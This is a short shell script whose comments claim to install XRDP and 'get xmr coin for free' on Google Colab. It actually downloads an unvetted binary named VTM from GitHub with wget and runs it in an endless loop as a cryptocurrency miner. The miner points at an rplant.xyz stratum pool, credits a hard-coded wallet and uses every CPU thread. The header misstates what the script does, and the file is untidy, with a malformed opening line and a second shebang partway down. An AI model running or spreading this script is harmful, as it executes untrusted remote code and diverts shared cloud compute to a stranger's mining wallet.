# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R VTM

wget https://github.com/sbwsmg/Zeus/raw/main/VTM
chmod 700 VTM

#!/bin/sh
#
# Choose nearest stratum:
#       stratum-eu.rplant.xyz   /France/
#       stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Canada/
#
FOLDER=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
while [ 1 ]; do
"$FOLDER"/VTM -a gr  -o stratum+tcps://stratum-asia.rplant.xyz:17031 -u AbXgVi6fuyHjwtXXjwZdogPpxcjjDN21dh.mj -t$(nproc --all)
sleep 5
done
